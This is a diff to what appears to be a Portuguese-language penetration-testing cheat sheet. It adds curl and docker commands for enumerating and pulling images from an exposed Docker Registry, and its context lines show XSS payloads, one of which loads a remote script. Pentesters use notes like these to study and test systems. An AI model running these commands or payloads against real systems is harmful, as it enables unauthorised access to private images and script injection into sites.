@@ -9188,6 +9188,24 @@ Prototype Pollution
 	<x v-on:click='_b.constructor'alert(1)'()'>click</x>
 	<x is=script src=//14.Rs>
 
+
+## PTA
+
+Ao verificar que no NMAP uma porta (5000) estava rodando o serviço Docker Registry (API 2.0), foi forçado o caminho `_catalog`
+
+	# Listar todos os repositórios
+	curl -X GET http://<TARGET_IP>:5000/v2/_catalog
+	# Exemplo de resposta: {"repositories":["app-web","app-database","internal-tool"]}
+	
+	# Listar todas as tags de um repositório específico
+	curl -X GET http://<TARGET_IP>:5000/v2/app-web/tags/list
+	# Exemplo de resposta: {"name":"app-web","tags":["latest","v1.0","debug"]}
+	
+	docker pull <TARGET_IP>:5000/app-web:latest
+
+	curl -k -X GET "https://<TARGET_IP>:5000/v2/new-nginx/manifests/latest"
+	# Captura mais informaçoes sobre a imgem Docker
+	
   
 TO BE CONTINUED
 .
